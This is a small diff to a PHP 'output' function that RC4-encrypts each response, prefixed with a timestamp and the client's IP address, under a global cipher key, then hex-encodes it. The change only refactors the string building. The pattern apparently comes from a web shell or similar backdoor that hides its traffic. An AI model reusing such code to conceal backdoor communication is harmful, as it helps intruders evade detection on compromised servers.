@@ -994,7 +994,8 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain; charset=utf-8");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		echo bin2hex(rc4($GLOBALS['cipher_key'], @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.$str));
+		$str = @date("d M Y H:i:s",time()).'|'.$_SERVER['REMOTE_ADDR'].'|'.$str;
+		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 		die();
 	}
 }
